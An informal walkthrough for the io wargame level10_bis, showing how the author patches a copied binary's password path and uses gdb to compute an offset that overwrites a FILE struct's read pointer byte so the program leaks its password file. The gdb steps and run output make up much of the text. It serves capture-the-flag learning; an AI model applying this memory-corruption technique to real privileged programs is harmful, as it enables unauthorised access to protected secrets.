# Walkthrough

I recompiled level10_bis.c but due to difference with the process executing in gdb I couldn't fastly resolve the channel this way.
Since I'm a lazy fuck I copied the executable into /tmp/ directly and modified the hardoded string ```/levels/level10_bis.pass``` into ```/tmp/l10/level10_bb.pass``` inside vim:

My fake password file:
```bash
level10@io:/tmp/l10$ cat /tmp/l10/level10_bb.pass
01234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789PASSSPASSSSPASSSSPASSSSERRRRRRRRRRRRRRRRORRRRRRRRRRRRRRRRRRRRRRRRRRRRR
```

The idea is to overwrite the last byte of the read_ptr inside the IO_FILE struct so it goes back and read the pass.

Now all I have to do is 
```
(gdb) unset env LINES
(gdb) un set env COLUMNS // just in case?
(gdb) br *(address of the first instruction after fopen)
(gdb) set $byte=$eax
(gdb) br *(address at mov    BYTE PTR [ebp+eax*1-0x1c0],0x0 instruction)
(gdb) set $offset = $byte-$ebp-0x1c0
(gdb) p/d $offset	// the magic number
(gdb) r magic_number
```

Let's get out of gdb:

```
level10@io:/tmp/l10$ /levels/level10_bis magic_number
Welcome challengers
lengers
Welcome challengers
Welcome challengers
THE_PASSWORD_YEAH.
ACCESS DENIED...

level10@io:/tmp/l10$ ./executable THE_PASSWORD_YEAH.
```

Tip: escape the "!!" with printf "\x21\x21" unless you want some weird history stuff to popup	
